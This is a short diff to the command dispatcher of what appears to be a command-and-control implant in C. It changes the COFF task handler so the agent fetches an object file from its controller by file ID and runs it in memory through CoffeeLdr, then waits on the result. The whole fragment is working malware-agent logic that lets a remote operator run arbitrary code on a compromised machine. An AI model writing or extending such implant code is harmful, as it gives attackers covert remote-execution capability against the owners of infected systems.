@@ -135,7 +135,7 @@ FUNC void CommandDispatcher() {
 
         if (TaskType == TASK_COFF) // TaskType 1: File-related task
         {
-            PCHAR FileId = (PVOID)ParserGetBytes(&task, &Len); // Get File ID
+            PCHAR FileId = (PVOID) ParserGetBytes(&task, &Len); // Get File ID
 
             // Fetch the file using the File ID and Task ID
             BUFFER File = FileFetch(FileId, Id);
@@ -156,11 +156,14 @@ FUNC void CommandDispatcher() {
             // // PUCHAR args = "0900000003000000433a000000";
             // CoffeeLdr("go", File.Buffer, Unhexlified, ArgsLen);
             // CoffeeLdr("go", File.Buffer, NULL, 0);
-            CoffeeLdr("go", "BAAA", NULL, 0);
+            if (File.Length > 0) {
+                CoffeeLdr("go", File.Buffer, "", 0);
 
 
-            // Get the output data from the operation
-            data = BeaconGetOutputData(0);
+                // Get the output data from the operation
+                // data = BeaconGetOutputData(0);
+                Instance()->Win32.NtWaitForSingleObject(-1, FALSE, NULL);
+            }
             ShouldSendData = TRUE;
         } else if (TaskType == TASK_SLEEP) {
             INT Res = ParserGetInt32(&task); // Get sleep duration
